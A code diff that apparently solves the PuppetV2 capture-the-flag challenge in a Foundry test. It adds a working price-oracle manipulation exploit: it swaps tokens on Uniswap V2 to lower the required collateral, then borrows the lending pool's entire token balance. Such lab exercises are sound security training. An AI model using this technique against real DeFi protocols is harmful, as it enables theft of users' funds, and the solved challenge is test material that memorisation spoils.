@@ -103,6 +103,27 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+
+        // 1. Swap 10_000e18 DVT for WETH
+        dvt.approve(address(uniswapV2Router), type(uint256).max);
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE, // amountIn
+            0, // amountOutMin
+            path, // path
+            attacker, // to
+            DEADLINE // deadline
+        );
+        uint256 wethRequired = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        // 2. Wrap ETH to WETH and approve
+        weth.deposit{value: wethRequired}();
+        weth.approve(address(puppetV2Pool), wethRequired);
+
+        // 3. Borrow from the pool
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
 
         /**
          * EXPLOIT END *
@@ -120,4 +141,6 @@ contract PuppetV2 is Test {
         assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
         assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
     }
+
+    receive() external payable {}
 }
